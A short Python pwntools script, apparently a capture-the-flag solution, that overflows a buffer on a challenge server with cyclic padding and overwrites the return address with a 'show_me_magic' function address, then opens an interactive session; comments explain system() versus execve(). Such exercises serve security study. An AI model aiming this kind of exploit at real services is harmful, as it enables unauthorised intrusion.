#Return-to-libc

# system() and execve() work in different ways. 
# system() will always invoke the shell and this shell will execute the command as a separate process (this is why you can use wildcards and other shell facilities in the command line when using system()).
# execve() replaces the current process with the one being spawned directly (the execve() function doesn't return, except in case of failure). In fact system() implementation is supposed to use a sequence of fork(), execve() and wait() calls to perform its function.

from pwn import *
import struct

print(cyclic(100))

ip = 'ctf.adl.tw'
port = 11002

r = remote(ip, port)
payload = "aaaabaaacaaadaaaeaaafaaa"
# show_me_magic = 0x0000000000400627
payload += p64(0x0000000000400627)
payload += p64(0x0000000000400627)

r.sendline(payload)
r.interactive()
